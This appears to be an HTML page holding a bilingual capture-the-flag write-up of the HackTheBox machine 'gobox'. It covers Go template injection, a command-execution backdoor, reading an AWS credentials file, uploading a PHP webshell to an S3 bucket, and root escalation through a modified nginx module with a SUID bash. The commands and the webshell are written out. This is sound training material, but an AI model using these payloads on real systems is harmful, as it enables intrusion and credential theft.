@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gobox | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">gobox</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ===================== ENGLISH ===================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>The attack begins with reconnaissance, where a Go-powered web application on port 8080 is identified. The page title on port 80 leaks a Go template placeholder (<code>{{.Title}}</code>), hinting at a Server-Side Template Injection vulnerability. The <code>forgot password</code> functionality on the login page reflects user input, and by intercepting the request with Burp Suite and bypassing the frontend email validation, the full Go template context is exposed, confirming the SSTI vector.</p>
+
+                    <p>After logging in with credentials found via SSTI enumeration, the application source code reveals a <code>DebugCmd</code> backdoor function capable of running arbitrary OS commands. By invoking this function through the template injection, command execution is achieved as <code>root</code> inside what appears to be a container. From there, AWS credentials are discovered in <code>/root/.aws/credentials</code>, which are used to authenticate against a LocalStack S3 instance running on port 4566.</p>
+
+                    <p>The S3 bucket <code>website</code> contains the files served on port 80. A PHP webshell is uploaded to the bucket, which the web server executes, granting a reverse shell as <code>www-data</code> on the host machine. Post-exploitation enumeration reveals a locally-bound nginx server on port 8000 configured with a custom, modified <code>ngx_http_execute_module</code> backdoor module. The default trigger keyword has been changed to <code>ippsec.run</code>, but once identified via <code>strings</code>, it can be used to execute commands as root. A SUID bit is set on <code>/bin/bash</code> via this backdoor, completing the privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#66d9ef;">PORT</span>      <span style="color:#66d9ef;">STATE</span>     <span style="color:#66d9ef;">SERVICE</span>    <span style="color:#66d9ef;">VERSION</span>
+<span style="color:#a6e22e;">22/tcp</span>    open      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+<span style="color:#a6e22e;">80/tcp</span>    open      http       nginx
+<span style="color:#a6e22e;">4566/tcp</span>  open      http       nginx
+<span style="color:#a6e22e;">8080/tcp</span>  open      http       nginx
+<span style="color:#75715e;">9000/tcp</span>  filtered  cslistener
+<span style="color:#75715e;">9001/tcp</span>  filtered  tor-orport</code></pre>
+
+                <p>Several interesting services are visible. Port 80 and 8080 both run nginx HTTP servers, port 4566 is commonly associated with <strong>LocalStack</strong> (an AWS emulator), and ports 9000/9001 are filtered and inaccessible for now.</p>
+
+                <p>The title of port 80's page reads <code>Hacking eSports | {{.Title}}</code> — the <code>{{.Title}}</code> placeholder strongly suggests a Go template engine is in use. The response header <code>X-Forwarded-Server: golang</code> on port 8080 confirms Go is powering the backend.</p>
+
+                <p>Port 80 is a minimal page with no JavaScript, no links, and nothing found through directory fuzzing beyond an <code>index.html</code>. Port 8080 hosts a login form and a <code>/forgot</code> password reset page, but no valid credentials are known yet. Port 4566 returns a 403 Forbidden for all paths but is worth revisiting once credentials are found.</p>
+
+                <h2>SSTI Discovery — Forgot Password</h2>
+                <p>Testing the password reset form on port 8080 with a simple email address shows that the input is reflected back in the response:</p>
+
+                <p><img src="./media/image3.png" alt="Password reset page reflecting user input back onto the page" /></p>
+
+                <p>The email field has a frontend-only validation constraint. By intercepting the request in Burp Suite and submitting an arbitrary string instead of a valid email, the full Go template context is exposed in the response:</p>
+
+                <p><img src="./media/image5.png" alt="Burp Suite request showing SSTI payload reflecting the full Go template context including credentials" /></p>
+
+                <p>This reveals a credential pair embedded in the template context:</p>
+                <pre><code class="language-plaintext"><span style="color:#a6e22e;">ippsec@hacking.esports</span> : <span style="color:#e6db74;">ippsSecretPassword</span></code></pre>
+
+                <p>The virtual host <code>hacking.esports</code> is added to <code>/etc/hosts</code> and virtual host fuzzing is attempted, but nothing additional is found.</p>
+
+                <h2>Source Code Disclosure — DebugCmd Backdoor</h2>
+                <p>Logging in with the discovered credentials doesn't lead to a normal dashboard — instead, the response contains what appears to be the Go application's source code. Inside, a particularly interesting function stands out:</p>
+
+                <pre><code class="language-go"><span style="color:#66d9ef;">func</span> (<span style="color:#a6e22e;">u</span> <span style="color:#a6e22e;">User</span>) <span style="color:#a6e22e;">DebugCmd</span>(<span style="color:#a6e22e;">test</span> <span style="color:#66d9ef;">string</span>) <span style="color:#66d9ef;">string</span> {
+    <span style="color:#a6e22e;">ipp</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Split</span>(<span style="color:#a6e22e;">test</span>, <span style="color:#e6db74;">" "</span>)
+    <span style="color:#a6e22e;">bin</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Join</span>(<span style="color:#a6e22e;">ipp</span>[:<span style="color:#ae81ff;">1</span>], <span style="color:#e6db74;">" "</span>)
+    <span style="color:#a6e22e;">args</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Join</span>(<span style="color:#a6e22e;">ipp</span>[<span style="color:#ae81ff;">1</span>:], <span style="color:#e6db74;">" "</span>)
+    <span style="color:#66d9ef;">if</span> <span style="color:#a6e22e;">len</span>(<span style="color:#a6e22e;">args</span>) &gt; <span style="color:#ae81ff;">0</span> {
+        <span style="color:#a6e22e;">out</span>, _ := <span style="color:#a6e22e;">exec</span>.<span style="color:#a6e22e;">Command</span>(<span style="color:#a6e22e;">bin</span>, <span style="color:#a6e22e;">args</span>).<span style="color:#a6e22e;">CombinedOutput</span>()
+        <span style="color:#66d9ef;">return</span> <span style="color:#66d9ef;">string</span>(<span style="color:#a6e22e;">out</span>)
+    } <span style="color:#66d9ef;">else</span> {
+        <span style="color:#a6e22e;">out</span>, _ := <span style="color:#a6e22e;">exec</span>.<span style="color:#a6e22e;">Command</span>(<span style="color:#a6e22e;">bin</span>).<span style="color:#a6e22e;">CombinedOutput</span>()
+        <span style="color:#66d9ef;">return</span> <span style="color:#66d9ef;">string</span>(<span style="color:#a6e22e;">out</span>)
+    }
+}</code></pre>
+
+                <p>The <code>DebugCmd</code> method on the <code>User</code> struct accepts a string, splits it into a binary and arguments, and directly executes it via <code>exec.Command</code>. This is a classic command execution backdoor. Since it is a method on a <code>User</code> object and the template engine can call methods on reflected objects, it is callable directly through SSTI.</p>
+
+                <h2>Remote Code Execution via SSTI</h2>
+                <p>Using the Go template injection vector in the forgot password form, the <code>DebugCmd</code> method can be invoked to run arbitrary commands on the server:</p>
+
+                <p><img src="./media/image1.png" alt="SSTI payload calling DebugCmd to execute the id command, showing output as root inside a container" /></p>
+
+                <p>The command output shows the process is running as <code>root</code>. However, attempts to send a reverse shell through various methods fail, which — combined with the direct root access — strongly suggests this is a containerised environment rather than the actual host machine.</p>
+
+                <h2>AWS Credentials Discovery — LocalStack</h2>
+                <p>Exploring the filesystem with simple <code>ls</code> and <code>cat</code> commands through the SSTI vector, a <code>.aws</code> directory is found under <code>/root</code> containing a <code>credentials</code> file:</p>
+
+                <p><img src="./media/image2.png" alt="SSTI command execution showing the contents of /root/.aws/credentials with AWS access keys" /></p>
+
+                <pre><code class="language-ini"><span style="color:#66d9ef;">[default]</span>
+<span style="color:#a6e22e;">aws_access_key_id</span>=<span style="color:#e6db74;">SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz</span>
+<span style="color:#a6e22e;">aws_secret_access_key</span>=<span style="color:#e6db74;">SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz</span></code></pre>
+
+                <p>These credentials are saved locally to <code>~/.aws/credentials</code> under the <code>[default]</code> profile. To avoid typing the endpoint URL on every command, an alias is created pointing at the LocalStack instance on port 4566:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">alias</span> <span style="color:#a6e22e;">awslocal</span>=<span style="color:#e6db74;">'aws --endpoint-url http://10.129.95.236:4566 --profile default'</span></code></pre>
+
+                <h2>S3 Enumeration — Webshell Upload</h2>
+                <p>Listing available S3 buckets reveals a bucket named <code>website</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 ls</code></pre>
+                <pre><code class="language-plaintext">2026-04-26 13:00:50 website</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 ls s3://website</code></pre>
+                <pre><code class="language-plaintext">PRE css/
+    1294778 bottom.png
+    165551  header.png
+    5       index.html
+    1803    index.php</code></pre>
+
+                <p>The bucket contains the files being served on port 80. Since the bucket is writable via the AWS CLI, it should be possible to upload a PHP webshell that the nginx server will execute. A simple webshell is created and uploaded:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">cat</span> xd.php</code></pre>
+                <pre><code class="language-php"><span style="color:#f92672;">&lt;?php</span> <span style="color:#a6e22e;">system</span>(<span style="color:#a6e22e;">$_GET</span>[<span style="color:#e6db74;">'cmd'</span>]); <span style="color:#f92672;">?&gt;</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 cp xd.php s3://website/xd.php</code></pre>
+                <pre><code class="language-plaintext">upload: ./xd.php to s3://website/xd.php</code></pre>
+
+                <p>Navigating to the uploaded file on port 80 confirms the webshell is being executed by the server:</p>
+
+                <p><img src="./media/image4.png" alt="Browser showing the PHP webshell executing the id command successfully via the cmd GET parameter" /></p>
+
+                <p>With confirmed command execution via the webshell, a reverse shell payload is sent through the <code>cmd</code> parameter, gaining interactive access as <code>www-data</code> on the actual host machine. The user <code>ubuntu</code> is visible in <code>/home</code>.</p>
+
+                <h2>Privilege Escalation — NginxExecute Backdoor Module</h2>
+                <p>Enumerating the local system, port 8000 is found listening only on localhost (<code>127.0.0.1:8000</code>). Inspecting <code>/etc/nginx/sites-enabled/default</code> reveals an unusual nginx server block configuration for this port:</p>
+
+                <pre><code class="language-nginx"><span style="color:#66d9ef;">server</span> {
+    <span style="color:#a6e22e;">listen</span> <span style="color:#e6db74;">127.0.0.1:8000</span>;
+    <span style="color:#a6e22e;">location</span> / {
+        <span style="color:#a6e22e;">command</span> on;
+    }
+}</code></pre>
+
+                <p>The <code>command on</code> directive is not a standard nginx option. Investigating the loaded nginx modules reveals why:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">cat</span> /etc/nginx/modules-enabled/50-backdoor.conf</code></pre>
+                <pre><code class="language-plaintext">load_module modules/ngx_http_execute_module.so;</code></pre>
+
+                <p>This is the <a href="https://github.com/limithit/NginxExecute">NginxExecute</a> module — a known nginx module that enables HTTP-triggered command execution. According to its documentation, commands are passed via query string using the <code>system.run[cmd]</code> syntax. However, trying this directly returns an empty response:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> localhost:8000/?system.run[id]</code></pre>
+                <pre><code class="language-plaintext">curl: (52) Empty reply from server</code></pre>
+
+                <p>The module is loaded but not responding as expected. The compiled <code>.so</code> file may have been modified. Locating and inspecting it with <code>strings</code> reveals the answer:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">find</span> / -iname <span style="color:#e6db74;">"*ngx_http*"</span> 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/nginx/modules/ngx_http_execute_module.so</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">strings</span> /usr/lib/nginx/modules/ngx_http_execute_module.so | grep run</code></pre>
+                <pre><code class="language-plaintext">ippsec.run</code></pre>
+
+                <p>The module has been recompiled with a custom trigger keyword: <code>ippsec.run</code> instead of the default <code>system.run</code>. Using this keyword, the module responds correctly and executes commands as root:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[id]'</span></code></pre>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>Commands with spaces or special characters need to be URL-encoded, since they would otherwise break the URL parsing. A small helper script is placed in <code>/tmp/xd.sh</code> to chain commands. First, it is tested with a simple <code>id</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'</span></code></pre>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>The script is then updated to set the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">echo</span> <span style="color:#e6db74;">'chmod u+s /bin/bash'</span> &gt; /tmp/xd.sh
+<span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'</span></code></pre>
+
+                <p>With the SUID bit set on <code>/bin/bash</code>, a privileged shell is spawned using the <code>-p</code> flag, which preserves the effective UID:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">bash</span> -p</code></pre>
+                <pre><code class="language-plaintext">bash-5.0# whoami
+root</code></pre>
+
+                <p>Full root access on the host machine is achieved. The root flag can now be retrieved.</p>
+            </div>
+
+            <!-- ===================== ESPAÑOL ===================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>El ataque comienza con reconocimiento, donde se identifica una aplicación web en Go en el puerto 8080. El título de la página del puerto 80 filtra un marcador de plantilla de Go (<code>{{.Title}}</code>), insinuando una vulnerabilidad de Server-Side Template Injection. La funcionalidad <code>forgot password</code> de la página de login refleja la entrada del usuario, y al interceptar la petición con Burp Suite y saltarse la validación de email del frontend, se expone el contexto completo de la plantilla Go, confirmando el vector SSTI.</p>
+
+                    <p>Tras iniciar sesión con las credenciales descubiertas mediante la enumeración SSTI, el código fuente de la aplicación revela una función backdoor <code>DebugCmd</code> capaz de ejecutar comandos arbitrarios del sistema operativo. Invocando esta función a través de la inyección de plantilla se consigue ejecución de comandos como <code>root</code> dentro de lo que parece ser un contenedor. Desde allí, se descubren credenciales de AWS en <code>/root/.aws/credentials</code>, que se utilizan para autenticarse contra una instancia de LocalStack S3 corriendo en el puerto 4566.</p>
+
+                    <p>El bucket S3 <code>website</code> contiene los archivos servidos en el puerto 80. Se sube una webshell PHP al bucket, que el servidor web ejecuta, otorgando una reverse shell como <code>www-data</code> en la máquina host. La enumeración post-explotación revela un servidor nginx vinculado localmente en el puerto 8000 configurado con un módulo backdoor <code>ngx_http_execute_module</code> personalizado y modificado. La palabra clave disparadora por defecto ha sido cambiada a <code>ippsec.run</code>, pero una vez identificada mediante <code>strings</code>, puede utilizarse para ejecutar comandos como root. Se activa el bit SUID en <code>/bin/bash</code> a través de este backdoor, completando la escalada de privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los puertos abiertos y los servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#66d9ef;">PORT</span>      <span style="color:#66d9ef;">STATE</span>     <span style="color:#66d9ef;">SERVICE</span>    <span style="color:#66d9ef;">VERSION</span>
+<span style="color:#a6e22e;">22/tcp</span>    open      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+<span style="color:#a6e22e;">80/tcp</span>    open      http       nginx
+<span style="color:#a6e22e;">4566/tcp</span>  open      http       nginx
+<span style="color:#a6e22e;">8080/tcp</span>  open      http       nginx
+<span style="color:#75715e;">9000/tcp</span>  filtered  cslistener
+<span style="color:#75715e;">9001/tcp</span>  filtered  tor-orport</code></pre>
+
+                <p>Se aprecian varios servicios interesantes. Los puertos 80 y 8080 ejecutan servidores HTTP nginx, el puerto 4566 se asocia habitualmente con <strong>LocalStack</strong> (un emulador de AWS), y los puertos 9000/9001 están filtrados e inaccesibles por ahora.</p>
+
+                <p>El título de la página del puerto 80 es <code>Hacking eSports | {{.Title}}</code> — el marcador <code>{{.Title}}</code> sugiere con fuerza el uso de un motor de plantillas de Go. La cabecera de respuesta <code>X-Forwarded-Server: golang</code> en el puerto 8080 confirma que Go alimenta el backend.</p>
+
+                <p>El puerto 80 es una página mínima sin JavaScript, sin enlaces y sin nada encontrado mediante fuzzing de directorios más allá de un <code>index.html</code>. El puerto 8080 aloja un formulario de login y una página de restablecimiento de contraseña en <code>/forgot</code>, pero aún no hay credenciales válidas. El puerto 4566 devuelve 403 Forbidden en todas las rutas, pero merece revisitarse en cuanto se encuentren credenciales.</p>
+
+                <h2>Descubrimiento del SSTI — Forgot Password</h2>
+                <p>Probar el formulario de restablecimiento de contraseña del puerto 8080 con una dirección de email simple muestra que la entrada se refleja en la respuesta:</p>
+
+                <p><img src="./media/image3.png" alt="Página de restablecimiento de contraseña reflejando la entrada del usuario en la respuesta" /></p>
+
+                <p>El campo de email tiene una validación únicamente en el frontend. Al interceptar la petición en Burp Suite y enviar una cadena arbitraria en lugar de un email válido, el contexto completo de la plantilla Go queda expuesto en la respuesta:</p>
+
+                <p><img src="./media/image5.png" alt="Petición en Burp Suite mostrando un payload SSTI que refleja el contexto completo de la plantilla Go, incluyendo credenciales" /></p>
+
+                <p>Esto revela un par de credenciales incrustado en el contexto de la plantilla:</p>
+                <pre><code class="language-plaintext"><span style="color:#a6e22e;">ippsec@hacking.esports</span> : <span style="color:#e6db74;">ippsSecretPassword</span></code></pre>
+
+                <p>Se añade el virtual host <code>hacking.esports</code> a <code>/etc/hosts</code> y se intenta fuzzing de virtual hosts, pero no se encuentra nada adicional.</p>
+
+                <h2>Divulgación de Código Fuente — Backdoor DebugCmd</h2>
+                <p>Iniciar sesión con las credenciales descubiertas no conduce a un panel de control normal — en cambio, la respuesta contiene lo que parece ser el código fuente de la aplicación Go. En su interior, destaca una función especialmente interesante:</p>
+
+                <pre><code class="language-go"><span style="color:#66d9ef;">func</span> (<span style="color:#a6e22e;">u</span> <span style="color:#a6e22e;">User</span>) <span style="color:#a6e22e;">DebugCmd</span>(<span style="color:#a6e22e;">test</span> <span style="color:#66d9ef;">string</span>) <span style="color:#66d9ef;">string</span> {
+    <span style="color:#a6e22e;">ipp</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Split</span>(<span style="color:#a6e22e;">test</span>, <span style="color:#e6db74;">" "</span>)
+    <span style="color:#a6e22e;">bin</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Join</span>(<span style="color:#a6e22e;">ipp</span>[:<span style="color:#ae81ff;">1</span>], <span style="color:#e6db74;">" "</span>)
+    <span style="color:#a6e22e;">args</span> := <span style="color:#a6e22e;">strings</span>.<span style="color:#a6e22e;">Join</span>(<span style="color:#a6e22e;">ipp</span>[<span style="color:#ae81ff;">1</span>:], <span style="color:#e6db74;">" "</span>)
+    <span style="color:#66d9ef;">if</span> <span style="color:#a6e22e;">len</span>(<span style="color:#a6e22e;">args</span>) &gt; <span style="color:#ae81ff;">0</span> {
+        <span style="color:#a6e22e;">out</span>, _ := <span style="color:#a6e22e;">exec</span>.<span style="color:#a6e22e;">Command</span>(<span style="color:#a6e22e;">bin</span>, <span style="color:#a6e22e;">args</span>).<span style="color:#a6e22e;">CombinedOutput</span>()
+        <span style="color:#66d9ef;">return</span> <span style="color:#66d9ef;">string</span>(<span style="color:#a6e22e;">out</span>)
+    } <span style="color:#66d9ef;">else</span> {
+        <span style="color:#a6e22e;">out</span>, _ := <span style="color:#a6e22e;">exec</span>.<span style="color:#a6e22e;">Command</span>(<span style="color:#a6e22e;">bin</span>).<span style="color:#a6e22e;">CombinedOutput</span>()
+        <span style="color:#66d9ef;">return</span> <span style="color:#66d9ef;">string</span>(<span style="color:#a6e22e;">out</span>)
+    }
+}</code></pre>
+
+                <p>El método <code>DebugCmd</code> del struct <code>User</code> acepta una cadena, la divide en un binario y sus argumentos, y lo ejecuta directamente mediante <code>exec.Command</code>. Es un backdoor de ejecución de comandos clásico. Como es un método sobre un objeto <code>User</code> y el motor de plantillas puede invocar métodos sobre objetos reflejados, es invocable directamente a través del SSTI.</p>
+
+                <h2>Ejecución Remota de Código via SSTI</h2>
+                <p>Usando el vector de inyección de plantilla Go en el formulario de forgot password, el método <code>DebugCmd</code> puede invocarse para ejecutar comandos arbitrarios en el servidor:</p>
+
+                <p><img src="./media/image1.png" alt="Payload SSTI llamando a DebugCmd para ejecutar el comando id, mostrando la salida como root dentro de un contenedor" /></p>
+
+                <p>La salida del comando muestra que el proceso se ejecuta como <code>root</code>. Sin embargo, los intentos de enviar una reverse shell mediante varios métodos fallan, lo que — junto con el acceso directo como root — sugiere con fuerza que se trata de un entorno contenedorizado y no de la máquina host real.</p>
+
+                <h2>Descubrimiento de Credenciales AWS — LocalStack</h2>
+                <p>Explorando el sistema de archivos con comandos simples de <code>ls</code> y <code>cat</code> a través del vector SSTI, se encuentra un directorio <code>.aws</code> bajo <code>/root</code> que contiene un archivo <code>credentials</code>:</p>
+
+                <p><img src="./media/image2.png" alt="Ejecución de comandos via SSTI mostrando el contenido de /root/.aws/credentials con las claves de acceso de AWS" /></p>
+
+                <pre><code class="language-ini"><span style="color:#66d9ef;">[default]</span>
+<span style="color:#a6e22e;">aws_access_key_id</span>=<span style="color:#e6db74;">SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz</span>
+<span style="color:#a6e22e;">aws_secret_access_key</span>=<span style="color:#e6db74;">SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz</span></code></pre>
+
+                <p>Estas credenciales se guardan localmente en <code>~/.aws/credentials</code> bajo el perfil <code>[default]</code>. Para evitar escribir la URL del endpoint en cada comando, se crea un alias apuntando a la instancia de LocalStack en el puerto 4566:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">alias</span> <span style="color:#a6e22e;">awslocal</span>=<span style="color:#e6db74;">'aws --endpoint-url http://10.129.95.236:4566 --profile default'</span></code></pre>
+
+                <h2>Enumeración de S3 — Subida de Webshell</h2>
+                <p>Listar los buckets S3 disponibles revela un bucket llamado <code>website</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 ls</code></pre>
+                <pre><code class="language-plaintext">2026-04-26 13:00:50 website</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 ls s3://website</code></pre>
+                <pre><code class="language-plaintext">PRE css/
+    1294778 bottom.png
+    165551  header.png
+    5       index.html
+    1803    index.php</code></pre>
+
+                <p>El bucket contiene los archivos que se sirven en el puerto 80. Dado que el bucket es escribible mediante la CLI de AWS, debería ser posible subir una webshell PHP que el servidor nginx ejecute. Se crea y sube una webshell simple:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">cat</span> xd.php</code></pre>
+                <pre><code class="language-php"><span style="color:#f92672;">&lt;?php</span> <span style="color:#a6e22e;">system</span>(<span style="color:#a6e22e;">$_GET</span>[<span style="color:#e6db74;">'cmd'</span>]); <span style="color:#f92672;">?&gt;</span></code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">awslocal</span> s3 cp xd.php s3://website/xd.php</code></pre>
+                <pre><code class="language-plaintext">upload: ./xd.php to s3://website/xd.php</code></pre>
+
+                <p>Navegar al archivo subido en el puerto 80 confirma que la webshell está siendo ejecutada por el servidor:</p>
+
+                <p><img src="./media/image4.png" alt="Navegador mostrando la webshell PHP ejecutando el comando id con éxito mediante el parámetro GET cmd" /></p>
+
+                <p>Con ejecución de comandos confirmada a través de la webshell, se envía un payload de reverse shell a través del parámetro <code>cmd</code>, obteniendo acceso interactivo como <code>www-data</code> en la máquina host real. El usuario <code>ubuntu</code> es visible en <code>/home</code>.</p>
+
+                <h2>Escalada de Privilegios — Módulo Backdoor NginxExecute</h2>
+                <p>Enumerando el sistema local, se encuentra el puerto 8000 escuchando únicamente en localhost (<code>127.0.0.1:8000</code>). Inspeccionando <code>/etc/nginx/sites-enabled/default</code> se revela un bloque de servidor nginx inusual para este puerto:</p>
+
+                <pre><code class="language-nginx"><span style="color:#66d9ef;">server</span> {
+    <span style="color:#a6e22e;">listen</span> <span style="color:#e6db74;">127.0.0.1:8000</span>;
+    <span style="color:#a6e22e;">location</span> / {
+        <span style="color:#a6e22e;">command</span> on;
+    }
+}</code></pre>
+
+                <p>La directiva <code>command on</code> no es una opción estándar de nginx. Investigando los módulos cargados de nginx se revela el motivo:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">cat</span> /etc/nginx/modules-enabled/50-backdoor.conf</code></pre>
+                <pre><code class="language-plaintext">load_module modules/ngx_http_execute_module.so;</code></pre>
+
+                <p>Este es el módulo <a href="https://github.com/limithit/NginxExecute">NginxExecute</a> — un módulo de nginx conocido que permite la ejecución de comandos disparada por HTTP. Según su documentación, los comandos se pasan mediante la query string usando la sintaxis <code>system.run[cmd]</code>. Sin embargo, intentarlo directamente devuelve una respuesta vacía:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> localhost:8000/?system.run[id]</code></pre>
+                <pre><code class="language-plaintext">curl: (52) Empty reply from server</code></pre>
+
+                <p>El módulo está cargado pero no responde como se esperaba. El archivo <code>.so</code> compilado puede haber sido modificado. Localizarlo e inspeccionarlo con <code>strings</code> revela la respuesta:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">find</span> / -iname <span style="color:#e6db74;">"*ngx_http*"</span> 2&gt;/dev/null</code></pre>
+                <pre><code class="language-plaintext">/usr/lib/nginx/modules/ngx_http_execute_module.so</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">strings</span> /usr/lib/nginx/modules/ngx_http_execute_module.so | grep run</code></pre>
+                <pre><code class="language-plaintext">ippsec.run</code></pre>
+
+                <p>El módulo ha sido recompilado con una palabra clave disparadora personalizada: <code>ippsec.run</code> en lugar del <code>system.run</code> por defecto. Usando esta palabra clave, el módulo responde correctamente y ejecuta comandos como root:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[id]'</span></code></pre>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>Los comandos con espacios o caracteres especiales necesitan estar codificados en URL, ya que de lo contrario romperían el parseo de la URL. Se coloca un pequeño script auxiliar en <code>/tmp/xd.sh</code> para encadenar comandos. Primero se prueba con un simple <code>id</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'</span></code></pre>
+                <pre><code class="language-plaintext">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+                <p>El script se actualiza a continuación para activar el bit SUID en <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef;">echo</span> <span style="color:#e6db74;">'chmod u+s /bin/bash'</span> &gt; /tmp/xd.sh
+<span style="color:#a6e22e;">curl</span> <span style="color:#e6db74;">'localhost:8000/?ippsec.run[bash%20tmp%2fxd.sh]'</span></code></pre>
+
+                <p>Con el bit SUID activado en <code>/bin/bash</code>, se lanza un shell privilegiado usando el flag <code>-p</code>, que preserva el UID efectivo:</p>
+
+                <pre><code class="language-bash"><span style="color:#a6e22e;">bash</span> -p</code></pre>
+                <pre><code class="language-plaintext">bash-5.0# whoami
+root</code></pre>
+
+                <p>Se consigue acceso root completo en la máquina host. La flag de root puede recuperarse ahora.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
